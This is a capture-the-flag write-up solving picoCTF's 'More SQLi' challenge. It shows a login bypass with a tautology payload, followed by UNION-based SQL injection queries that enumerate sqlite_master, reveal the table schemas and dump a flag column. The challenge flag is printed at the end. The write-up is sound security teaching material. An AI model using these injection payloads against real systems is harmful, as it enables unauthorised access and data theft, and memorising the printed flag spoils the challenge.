# More SQLi
> Write-up author: jon-brandy
## DESCRIPTION:
Can you find the flag on this website. Try to find the flag here.
## HINT:
1. SQLiLite
## STEPS:
1. In this challenge we're given a web app which has a login feature.

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/db8c1921-0648-47d5-a142-21143589adcf)


2. Let's fill both username and password as `' OR "1=1"-- -`.

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/45b39565-ab9c-4b01-8610-62d49c0d92a0)



3. Successfully logged in, now we need to dump the data, based from the hint the DBMS might be sqlite3, let's try to find the number of columns (should be 3, because it shows us 3, but let's check it again) that could be viewed, use this query:

```sql
' UNION SELECT 1,2,3-- -
```

![sqlite3](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/a94c99c3-bf07-4f23-854f-437f4d83ef5f)


> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/5918ec8c-8e42-495e-acff-28d7d877d6c8)


4. Great now let's dump all the table name from sqlite_master, query:

```sql
' UNION SELECT 1, tbl_name, 3 FROM sqlite_master;--
```

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/b8b519b2-b0f7-4dce-8c24-2f13261024cc)


5. Great now we know that there's 4 table name within sqlite_master, but things to note here. In sqlite3, there's a column name named sql in sqlite_master. This column stores all the SQL syntax used to create database object.
6. Let's run this query:

```sql
' UNION SELECT 1, sql, 3 FROM sqlite_master;--
```

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/ff82720b-1d97-41f7-84be-50b3fd3f72be)


7. Notice inside the more_table table, it stored a column named flag, this should be our interest now. Let's run this query:

```sql
' UNION SELECT 1, flag, 3 FROM more_table;--
```

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/16a5eb6a-dfe2-43b2-a6cb-e5259bdce4a2)


8. Got the flag!

## FLAG:

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
```


